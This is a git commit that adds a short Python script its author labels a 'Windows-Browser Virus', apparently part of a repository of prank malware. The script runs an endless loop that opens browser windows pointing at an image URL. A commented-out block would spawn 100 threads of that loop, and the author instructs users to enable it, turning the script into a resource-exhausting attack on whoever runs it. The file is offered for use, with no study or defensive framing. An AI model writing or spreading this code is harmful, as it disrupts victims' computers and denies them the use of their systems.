371c01b5d0844286d8c27a8a99465cf62718daf6
Cᴏɴғᴜsᴇᴅ Cʜᴀʀᴀᴄᴛᴇʀ <121636230+ConfusedCharacter@users.noreply.github.com>
2023-01-02 15:27:15 -0800

    Create Windows-Browser.py

---
+++ Windows-Browser.py
@@ -0,0 +1,18 @@
+# Windows-Browser Virus
+# By Confused Character
+# github https://github.com/ConfusedCharacter/Python-Virus/
+
+
+import os
+import threading
+
+def start():
+    while True:
+        os.system("start http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg")
+
+# please be sure then clear for loop hastag
+#for thd in range(100):
+#   threading.Thread(target=start).start()
+
+#█▀▀ █▀█ █▄░█ █▀▀ █░█ █▀ █▀▀ █▀▄   █▀▀ █░█ ▄▀█ █▀█ ▄▀█ █▀▀ ▀█▀ █▀▀ █▀█
+#█▄▄ █▄█ █░▀█ █▀░ █▄█ ▄█ ██▄ █▄▀   █▄▄ █▀█ █▀█ █▀▄ █▀█ █▄▄ ░█░ ██▄ █▀▄
